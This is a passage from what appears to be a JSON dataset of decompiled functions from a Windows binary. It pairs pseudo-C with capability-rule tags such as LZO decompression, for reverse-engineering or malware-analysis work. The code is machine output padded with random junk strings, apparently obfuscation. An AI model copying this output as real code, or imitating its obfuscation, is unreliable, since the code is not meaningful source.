code_r0x004388b5;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00438b4c:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x00438b58:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x00438b64:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x00438b70:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x00438b7c:\n    uStack64 = 5;\n    fcn.004047f5();\ncode_r0x00438b88:\n    uStack64 = 6;\n    fcn.004047f5();\ncode_r0x00438b94:\n    uStack64 = 7;\n    fcn.004047f5();\ncode_r0x00438ba0:\n    uStack64 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2456
    },
    "004394a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint * __fastcall fcn.004394a0(uint *param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    int32_t *in_FS_OFFSET;\n    uint auStack180 [3];\n    uint uStack168;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack112;\n    int32_t aiStack108 [5];\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffff94;\n    puStack32 = &stack0xffffff94;\n    uStack24 = 0x44c880;\n    iStack28 = *in_FS_OFFSET;\n    puStack112 = &stack0xffffffe4;\n    *in_FS_OFFSET = puStack112;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    piStack40 = &stack0xffffff4c;\n    uStack152 = 0;\n    uStack148 = 0xf;\n    uStack168 = 0;\n    uStack20 = 3;\n    puStack56 = param_1;\n    fcn.00402f72(0x11);\n    puVar8 = piStack40;\n    piStack40[1] = 0x40d05540;\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    *(puVar8 + 9) = 0;\n    *(puVar8 + 10) = 1;\n    *(puVar8 + 0xb) = 0;\n    *(puVar8 + 0xc) = 0;\n    *(puVar8 + 0xd) = 1;\n    uVar2 = *0x54259c;\n    uVar1 = *0x542598;\n    uVar5 = *0x542594;\n    puVar8[0xe] = *0x542590;\n    puVar8[0xf] = uVar5;\n    puVar8[0x10] = uVar1;\n    puVar8[0x11] = uVar2;\n    uVar5 = fcn.00402b30();\n    puVar8 = puStack44;\n    puVar11 = puStack44 + -1;\n    puStack44[-1] = uVar5;\n    piStack40 = puVar8 + -7;\n    puVar8[-6] = 0;\n    puVar8[-2] = 0;\n    *puVar11 = 0xf;\n    *(puVar8 + -6) = 0;\n    *(puVar8 + -9) = uStack36;\n    puVar8[-8] = \"rfgkhfcyjixthquamfxdmahllmkmszblrdiktzkuytcpvwijobttwapxngpgfcsjti\";\n    puVar8[-10] = 0x42;\n    puVar8[-0xb] = 0x4395b3;\n    fcn.00402f72();\n    *piStack40 = 1;\n    puVar8[-0xb] = 0x4395be;\n    uVar5 = fcn.0040494e();\n    puVar8 = puStack44;\n    piStack40 = puStack44;\n    puVar12 = puStack44 + -1;\n    puStack44[-1] = uVar5;\n    puVar8[-6] = 0;\n    puVar8[-2] = 0;\n    *puVar12 = 0xf;\n    *(puVar8 + -6) = 0;\n    *(puVar8 + -8) = uStack36;\n    puVar8[-7] = \"ubcqkkoowfvadqfbkfdlushzkvsqwpyrofghlzujfjjhgkkwooeshkxvtntumgs\";\n    puVar8[-9] = 0x3f;\n    puVar8[-10] = 0x4395ff;\n    fcn.00402f72();\n    puVar8[-10] = 0x439604;\n    uVar5 = fcn.00401fc8();\n    puVar17 = piStack40;\n    puStack44 = piStack40;\n    piStack40[-1] = uVar5;\n    puStack52 = piStack40 + -8;\n    piStack40[-8] = 0;\n    piStack40[-4] = 0;\n    piStack40[-3] = 0xf;\n    puVar8 = piStack40 + -8;\n    piStack40 = piStack40 + -0x1e;\n    *puVar8 = 0;\n    *(puVar17 + -0x20) = uStack36;\n    puVar17[-0x1f] = \"fplcxsvrvvwlwfvruozthkztyrcuxodxxewnavrwojhedhdkzkzbffvzo\";\n    puVar17[-0x21] = 0x39;\n    puVar17[-0x22] = 0x439652;\n    fcn.00402f72();\n    puVar8 = piStack40;\n    puStack48 = piStack40 + 0xe;\n    piStack40[0xe] = 0;\n    puVar8[0x12] = 0;\n    puVar8[0x13] = 0xf;\n    *(puVar8 + 0xe) = 0;\n    uStack20 = 6;\n    *(puVar17 + -0x23) = uStack36;\n    puVar17[-0x22] = \"rpwcedjbmdazenebsgenrnpvjdjgknpgznhceowqzutdkybmlhebhbjqudu\";\n    puVar17[-0x24] = 0x3b;\n    puVar17[-0x25] = 0x439699;\n    fcn.00402f72();\n    puVar8 = piStack40;\n    puStack60 = piStack40 + 8;\n    piStack40[8] = 0;\n    puVar8[0xc] = 0;\n    puVar8[0xd] = 0xf;\n    *(puVar8 + 8) = 0;\n    uStack20 = 7;\n    *(puVar17 + -0x26) = uStack36;\n    puVar17[-0x25] = \"lrxkgnkfnfeuiwqzuidezhrjfvykbpftebyzxyznqnubwqymtauyt\";\n    puVar17[-0x27] = 0x35;\n    puVar17[-0x28] = 0x4396e0;\n    fcn.00402f72();\n    puVar8 = piStack40;\n    piStack40[2] = 0;\n    puVar8[6] = 0;\n    puVar8[7] = 0xf;\n    *(puVar8 + 2) = 0;\n    uStack20 = 8;\n    *(puVar17 + -0x29) = uStack36;\n    puVar17[-0x28] = \"bpiyarwonfewhyisciprhyahrc\";\n    puVar17[-0x2a] = 0x1a;\n    puVar17[-0x2b] = 0x439726;\n    fcn.00402f72();\n    puVar8 = piStack40;\n    piStack40[1] = 0x40b04a00;\n    *puVar8 = 0;\n    puVar8[0x14] = 0x591;\n    *(puVar8 + 0x15) = 1;\n    puVar8[0x1d] = 0x40cadb80;\n    puVar8[0x1c] = 0;\n    uStack20 = 3;\n    puVar17[-0x2b] = 0x43975b;\n    uVar5 = fcn.00402815();\n    puVar8 = puStack44;\n    puStack44[-1] = uVar5;\n    piStack40 = puVar8 + -0x19;\n    puStack52 = puVar8 + -7;\n    puVar8[-7] = 0;\n    puVar8[-3] = 0;\n    puVar8[-2] = 0xf;\n    *(puVar8 + -7) = 0;\n    *(puVar8 + -0x1b) = uStack36;\n    puVar8[-0x1a] = \"kgbhzzbdgedxxpsdoasfnlg\";\n    puVar8[-0x1c] = 0x17;\n    puVar8[-0x1d] = 0x4397a6;\n    fcn.00402f72();\n    puVar17 = piStack40;\n    puStack48 = piStack40 + 7;\n    piStack40[7] = 0;\n    puVar17[0xb] = 0;\n    puVar17[0xc] = 0xf;\n    *(puVar17 + 7) = 0;\n    uStack20 = 4;\n    *(puVar8 + -0x1e) = uStack36;\n    puVar8[-0x1d] = \"ntqhyylkteawttkudoycgwpzfwhoxwpwjfadtshstahlsqucjyhihctjiflebgjcwtcnhybu\";\n    puVar8[-0x1f] = 0x48;\n    puVar8[-0x20] = 0x4397ed;\n    fcn.00402f72();\n    puVar17 = piStack40;\n    piStack40[1] = 0;\n    puVar17[5] = 0;\n    puVar17[6] = 0xf;\n    *(puVar17 + 1) = 0;\n    uStack20 = 5;\n    *(puVar8 + -0x21) = uStack36;\n    puVar8[-0x20] = \"edkfyxqupysfgetmifvyjeucwhbez\";\n    puVar8[-0x22] = 0x1d;\n    puVar8[-0x23] = 0x439833;\n    fcn.00402f72();\n    puVar17 = piStack40;\n    *piStack40 = 0x513;\n    *(puVar17 + 0xd) = 0;\n    *(puVar17 + 0xe) = 0;\n    *(puVar17 + 0xf) = 0;\n    puVar17[0x10] = 0x179;\n    *(puVar17 + 0x11) = 0;\n    puVar17[0x18] = 0x1449;\n    uStack20 = 3;\n    puVar8[-0x23] = 0x439866;\n    uVar5 = fcn.004045ca();\n    puVar8 = puStack44;\n    puVar13 = puStack44 + -1;\n    puStack44[-1] = uVar5;\n    piStack40 = puVar8 + -0xc;\n    puVar8[-6] = 0;\n    puVar8[-2] = 0;\n    *puVar13 = 0xf;\n    *(puVar8 + -6) = 0;\n    *(puVar8 + -0xe) = uStack36;\n    puVar8[-0xd] = \"oenuchoqcxuuupebrwmba\";\n    puVar8[-0xf] = 0x15;\n    puVar8[-0x10] = 0x4398ac;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 1;\n    *(puVar3 + 4) = 0x1f53;\n    puVar3[8] = 1;\n    *(puVar3 + 0xc) = 0x1c1;\n    *(puVar3 + 0x14) = 0x40f80350;\n    *(puVar3 + 0x10) = 0;\n    puVar8[-0x10] = 0x4398d7;\n    uVar5 = fcn.004044d5();\n    puVar8 = puStack44;\n    puStack44[-1] = uVar5;\n    piStack40 = puVar8 + -0x11;\n    puVar8[-7] = 0;\n    puVar8[-3] = 0;\n    puVar8[-2] = 0xf;\n    *(puVar8 + -7) = 0;\n    *(puVar8 + -0x13) = uStack36;\n    puVar8[-0x12] = \"ihavyhzvlivloldibicvicrmmkivsdljooriqbptbmkqodtcykwipqtqkqyqyyay\";\n    puVar8[-0x14] = 0x40;\n    puVar8[-0x15] = 0x43991d;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    uVar2 = *0x5425bc;\n    uVar1 = *0x5425b8;\n    uVar5 = *0x5425b4;\n    *(piStack40 + 0x18) = *0x5425b0;\n    *(puVar3 + 0x1c) = uVar5;\n    *(puVar3 + 0x20) = uVar1;\n    *(puVar3 + 0x24) = uVar2;\n    *(puVar3 + 8) = 0x76636576;\n    puVar3[0xc] = 0;\n    *puVar3 = 0;\n    *(puVar3 + 4) = 0x3d;\n    *(puVar3 + 0x40) = 0xbd7;\n    puVar8[-0x15] = 0x43994c;\n    uVar5 = fcn.00401d66();\n    puVar8 = puStack44;\n    puVar14 = puStack44 + -1;\n    puStack44[-1] = uVar5;\n    piStack40 = puVar8 + -7;\n    puVar8[-6] = 0;\n    puVar8[-2] = 0;\n    *puVar14 = 0xf;\n    *(puVar8 + -6) = 0;\n    puVar17 = puVar8 + -10;\n    *(puVar8 + -9) = uStack36;\n    puVar8[-8] = \"bodydrpqlhmxggqxhyhyahhcckwsbdtebnaofavordhagfkjxscdbiiwksiyyxggggfigdirljz\";\n    puVar8[-10] = 0x4b;\n    puVar8[-0xb] = 0x439992;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = 0;\n    uVar7 = piVar4[6];\n    if (0xf < uVar7) {\n        iVar10 = piVar4[1];\n        uVar6 = uVar7 + 1;\n        iVar9 = iVar10;\n        if (uVar6 < 0x1000) {\ncode_r0x004399c6:\n            puVar8[-0xb] = uVar6;\n            puVar8[-0xc] = iVar9;\n            puVar8[-0xd] = 0x4399cd;\n            uVar7 = fcn.00401a32(puVar8[-0xc]);\n            goto code_r0x004399d0;\n        }\n        iVar9 = *(iVar10 + -4);\n        if ((iVar10 + -4) - iVar9 < 0x20) {\n            uVar6 = uVar7 + 0x24;\n            goto code_r0x004399c6;\n        }\n        uStack20 = 0;\n        puVar8[-0xb] = 0x439bd7;\n        fcn.004047f5();\ncode_r0x00439bd7:\n        uStack20 = 1;\n        *(puVar17 + -4) = 0x439be3;\n        fcn.004047f5();\ncode_r0x00439be3:\n        uStack20 = 2;\n        puVar17[-1] = 0x439bef;\n        fcn.004047f5();\n        puVar17[-1] = &stack0xfffffffc;\n        puVar17[-0x20] = 0x439bfc;\n        fcn.004052d1();\n        puVar17[-0x20] = &stack0x00000008;\n        puVar17[-0x3f] = 0x439c0c;\n        fcn.004052d1();\n        puVar17[-0x3f] = &stack0x00000014;\n        puVar17[-0x5e] = 0x439c1c;\n        fcn.004052d1();\n        puVar17[-0x5e] = &stack0x00000020;\n        puVar17[-0x7d] = 0x439c2f;\n        puVar8 = fcn.00403a76();\n        return puVar8;\n    }\ncode_r0x004399d0:\n    puVar8 = puStack44;\n    puVar15 = puStack44 + -1;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar8 + -0xd;\n    puVar8[-6] = 0;\n    puVar8[-2] = 0;\n    *puVar15 = 0xf;\n    *(puVar8 + -6) = 0;\n    *(puVar8 + -0xf) = uStack36;\n    puVar8[-0xe] = \"nakmkvtysbwwowmcaxyodkcrzyikhgemrvixpefdpmvaklaanlcylr\";\n    puVar8[-0x10] = 0x36;\n    puVar8[-0x11] = 0x439a16;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack40[1] = 0x40e255e0;\n    *piVar4 = 0;\n    *(piVar4 + 2) = 0;\n    *(piVar4 + 3) = 1;\n    piVar4[5] = 0x40e35a60;\n    piVar4[4] = 0;\n    piVar4[6] = 0xee7;\n    puVar8[-0x11] = 0x439a48;\n    fcn.00403517();\n    puVar8 = puStack44;\n    puVar16 = puStack44 + -1;\n    puStack44[-1] = 0x60;\n    puVar8[-2] = 0x439a54;\n    uVar5 = fcn.004024b9(*puVar16, *puVar8);\n    puVar8[-1] = 0x60;\n    puVar8[-2] = uVar5;\n    puVar8[-3] = 0x439a5f;\n    fcn.00401a32(puVar8[-2]);\n    puVar8[-1] = 0;\n    puVar8[-3] = 0;\n    puVar8[-4] = 0x439a76;\n    fcn.00402a86();\n    puVar17 = puVar8 + -7;\n    puVar8[-7] = &stack0xffffffac;\n    puVar8[-5] = 0;\n    puVar8[-8] = 0x439a8c;\n    fcn.004017c6();\n    uVar7 = uStack64;\n    if (0xf < uStack64) {\n        uVar7 = uStack64 + 1;\n        uVar6 = uStack84;\n        if (0xfff < uVar7) {\n            uVar6 = *(uStack84 - 4);\n            if (0x1f < (uStack84 - 4) - uVar6) goto code_r0x00439bd7;\n            uVar7 = uStack64 + 0x24;\n        }\n        puVar8[-8] = uVar7;\n        puVar8[-9] = uVar6;\n        puVar8[-10] = 0x439ac1;\n        uVar7 = fcn.00401a32(puVar8[-9]);\n    }\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = uStack84 & 0xffffff00;\n    piStack40 = puVar8 + -7;\n    puVar8[-8] = uVar7;\n    puVar8[-8] = 0xf;\n    puVar8[-9] = 0xd;\n    puVar8[-0xd] = 0x68657761;\n    puVar8[-0xc] = 0x77746962;\n    puVar8[-0xb] = 0x6b65646d;\n    *(puVar8 + -10) = 0x6c;\n    *(puVar8 + -0xe) = 1;\n    puVar8[-0xf] = 0x439b10;\n    uVar5 = fcn.0040181b();\n    puVar17 = piStack40;\n    puStack44 = piStack40;\n    piStack40[-1] = uVar5;\n    piStack40[-7] = 0;\n    piStack40[-3] = 0;\n    piStack40[-2] = 0xf;\n    puVar8 = piStack40 + -7;\n    piStack40 = piStack40 + -0xe;\n    *puVar8 = 0;\n    *(puVar17 + -0x10) = uStack36;\n    puVar17[-0xf] =\n         \"mzzkvfiiyvwctfjeoqktutvnvnmnufmdynqigvxmnyfbwuwvsqavitlflumbpyicoqaddsfhhqtathhbpvnotsurvztkemuoavw\";\n    puVar17[-0x11] = 99;\n    puVar17[-0x12] = 0x439b59;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = &stack0xffffff94;\n    *(piVar4 + 1) = 0;\n    piVar4[2] = 0x7d9;\n    piVar4[3] = *0x5425d0;\n    piVar4[4] = *0x5425d4;\n    piVar4[5] = *0x5425d8;\n    piVar4[6] = *0x5425dc;\n    *(piVar4 + 0xd) = 0;\n    puVar17[-0x12] = 0x439b80;\n    fcn.0040375b();\n    puVar8 = puStack44;\n    if (0xf < uStack88) {\n        uVar7 = uStack88 + 1;\n        iVar10 = aiStack108[0];\n        if (0xfff < uVar7) {\n            iVar10 = *(aiStack108[0] + -4);\n            puVar17 = puStack44;\n            if (0x1f < (aiStack108[0] + -4) - iVar10) goto code_r0x00439be3;\n            uVar7 = uStack88 + 0x24;\n        }\n        puStack44[-1] = uVar7;\n        puVar8[-2] = iVar10;\n        puVar8[-3] = 0x439bb4;\n        fcn.00401a32(puVar8[-2]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return puStack56;\n}\n",
        "token_count": 5578
    },
    "0043a0e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.0043a0e0(void)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int32_t *arg_8h_00;\n    uint32_t unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    int32_t aiStack160 [4];\n    uint uStack144;\n    uint32_t uStack140;\n    uchar uStack136;\n    int32_t *piStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack96;\n    uint uStack72;\n    uint32_t uStack68;\n    char *pcStack64;\n    int32_t iStack60;\n    uint uStack52;\n    uint32_t uStack48;\n    uint uStack44;\n    uint32_t uStack40;\n    uint8_t uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &uStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c8c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack68 = uStack68 & 0xffffff00 | uStack36;\n    pcStack64 = \"lwonmcpornzkkcvnueeswuskqeetwvanbk\";\n    uStack72 = 0x22;\n    fcn.00402f72();\n    if (uStack40 < 0x10) {\ncode_r0x0043a17d:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    iStack116 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iStack116 = *(iStack60 + -4),  (iStack60 + -4) - iStack116 < 0x20)) {\n        fcn.00401a32(iStack116);\n        goto code_r0x0043a17d;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack132 = aiStack160;\n    uStack124 = 0x44c8d0;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    uStack144 = 0;\n    uStack140 = 0xf;\n    aiStack160[0] = 0;\n    uStack120 = 4;\n    fcn.00402f72(0x21, uStack136, \"migwufxqhhmvhczecuznampgjdujgymys\");\n    if (uStack140 < 0x10) {\ncode_r0x0043a259:\n        if (0x1f < (iStack96 + -4) - *(iStack96 + -4)) goto code_r0x0043a347;\n        fcn.00401a32(*(iStack96 + -4));\n        if (uStack48 < 0x10) {\ncode_r0x0043a2db:\n            uStack52 = 0;\n            uStack48 = 0xf;\n            uStack68 = uStack68 & 0xffffff00;\n            if (unaff_EBX < 0x10) {\ncode_r0x0043a323:\n                *in_FS_OFFSET = piStack128;\n                return 0x44ee;\n            }\n            arg_8h_00 = piStack28;\n            if ((unaff_EBX + 1 < 0x1000) || (arg_8h_00 = piStack28[-1],  piStack28 + (-4 - arg_8h_00) < 0x20)) {\n                fcn.00401a32(arg_8h_00);\n                goto code_r0x0043a323;\n            }\n            goto code_r0x0043a35f;\n        }\n        arg_8h = uStack68;\n        if ((uStack48 + 1 < 0x1000) || (arg_8h = *(uStack68 - 4),  (uStack68 - 4) - arg_8h < 0x20)) {\n            fcn.00401a32(arg_8h);\n            goto code_r0x0043a2db;\n        }\n    }\n    else {\n        iVar1 = aiStack160[0];\n        if ((uStack140 + 1 < 0x1000) || (iVar1 = *(aiStack160[0] + -4),  (aiStack160[0] + -4) - iVar1 < 0x20)) {\n            fcn.00401a32(iVar1);\n            goto code_r0x0043a259;\n        }\n        uStack120 = 0;\n        fcn.004047f5();\ncode_r0x0043a347:\n        uStack120 = 1;\n        fcn.004047f5();\n    }\n    uStack120 = 2;\n    fcn.004047f5();\ncode_r0x0043a35f:\n    uStack120 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1268
    },
    "0043a3e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.0043a3e0(uint32_t param_1)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c8e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000028 < 0x10) {\ncode_r0x0043a444:\n        *in_FS_OFFSET = piStack28;\n        return *0x5425e4;\n    }\n    iStack60 = in_stack_00000014;\n    if ((in_stack_00000028 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000014 + -4),  (in_stack_00000014 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x0043a444;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fVar3 = fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44c8f0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    ppuVar1 = &ppuStack76;\n    if (0xf < uStack20) {\n        iVar2 = in_stack_ffffffd8;\n        if ((0xfff < uStack20 + 1) && (iVar2 = *(in_stack_ffffffd8 + -4),  0x1f < (in_stack_ffffffd8 + -4) - iVar2)) {\n            uStack64 = 0;\n            fcn.004047f5();\n            goto code_r0x0043a547;\n        }\n        ppuStack76 = &ppuStack76;\n        fVar3 = fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack76;\n    }\n    ppuStack76 = ppuVar1;\n    uStack24 = 0;\n    uStack20 = 0xf;\n    if (0xf < param_1) {\n        iVar2 = unaff_ESI;\n        if ((0xfff < param_1 + 1) && (iVar2 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar2)) {\ncode_r0x0043a547:\n            uStack64 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            return *0x5425e8;\n        }\n        fVar3 = fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack72;\n    return fVar3;\n}\n",
        "token_count": 804
    },
    "0043abb0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.0043abb0(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack148 [4];\n    uint uStack132;\n    uint32_t uStack128;\n    uchar uStack124;\n    int32_t *piStack120;\n    int32_t *piStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    int32_t in_stack_ffffffac;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c930;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000030 < 0x10) {\ncode_r0x0043ac14:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    uStack60 = in_stack_0000001c;\n    if ((in_stack_00000030 + 1 < 0x1000) ||\n       (uStack60 = *(in_stack_0000001c - 4),  (in_stack_0000001c - 4) - uStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(uStack60);\n        goto code_r0x0043ac14;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44c940;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    if (unaff_EBX < 0x10) {\ncode_r0x0043acb4:\n        *in_FS_OFFSET = piStack72;\n        return 1;\n    }\n    piStack104 = piStack28;\n    if ((unaff_EBX + 1 < 0x1000) || (piStack104 = piStack28[-1],  piStack28 + (-4 - piStack104) < 0x20)) {\n        ppuStack76 = &ppuStack76;\n        fcn.00401a32(piStack104);\n        goto code_r0x0043acb4;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack120 = aiStack148;\n    uStack112 = 0x44c950;\n    piStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack116;\n    uStack132 = 0;\n    uStack128 = 0xf;\n    aiStack148[0] = 0;\n    uStack108 = 5;\n    fcn.00402f72(0x38, uStack124, \"qxaifbgaylgjysoczkgyruphezdwcvzbjgmnjibakalcfecakmvkctlq\");\n    if (uStack128 < 0x10) {\ncode_r0x0043ad99:\n        if (0xf < uStack64) {\n            iVar1 = in_stack_ffffffac;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(in_stack_ffffffac + -4),  0x1f < (in_stack_ffffffac + -4) - iVar1))\n            goto code_r0x0043aece;\n            fcn.00401a32(iVar1);\n        }\n        uStack68 = 0;\n        uStack64 = 0xf;\n        if (0xf < in_stack_ffffffd8) {\n            uVar2 = uStack60;\n            if ((0xfff < in_stack_ffffffd8 + 1) && (uVar2 = *(uStack60 - 4),  0x1f < (uStack60 - 4) - uVar2))\n            goto code_r0x0043aeda;\n            fcn.00401a32(uVar2);\n        }\n        uStack60 = uStack60 & 0xffffff00;\n        if (0xf < unaff_EDI) {\n            arg_8h = ppuStack32;\n            if ((0xfff < unaff_EDI + 1) && (arg_8h = *(ppuStack32 + -4),  0x1f < ppuStack32 + (-4 - arg_8h)))\n            goto code_r0x0043aee6;\n            fcn.00401a32(arg_8h);\n        }\n        ppuStack32 = ppuStack32 & 0xffffff00;\n        if (0xf < param_3) {\n            uVar2 = unaff_EBX;\n            if ((0xfff < param_3 + 1) && (uVar2 = *(unaff_EBX - 4),  0x1f < (unaff_EBX - 4) - uVar2))\n            goto code_r0x0043aef2;\n            fcn.00401a32(uVar2);\n        }\n        *in_FS_OFFSET = piStack116;\n        return piStack116;\n    }\n    iVar1 = aiStack148[0];\n    if ((uStack128 + 1 < 0x1000) || (iVar1 = *(aiStack148[0] + -4),  (aiStack148[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043ad99;\n    }\n    uStack108 = 0;\n    fcn.004047f5();\ncode_r0x0043aece:\n    uStack108 = 1;\n    fcn.004047f5();\ncode_r0x0043aeda:\n    uStack108 = 2;\n    fcn.004047f5();\ncode_r0x0043aee6:\n    uStack108 = 3;\n    fcn.004047f5();\ncode_r0x0043aef2:\n    uStack108 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1615
    },
    "0043af80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.0043af80(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t *in_FS_OFFSET;\n    uint auStack192 [7];\n    uint auStack164 [4];\n    uint uStack148;\n    uint uStack144;\n    uint auStack124 [4];\n    uint uStack108;\n    uint uStack104;\n    int32_t iStack100;\n    uint32_t auStack96 [4];\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack48 = &stack0xffffffa0;\n    puStack32 = &stack0xffffffa0;\n    uStack24 = 0x44c960;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack68 = param_1 + 4;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x14) = 0;\n  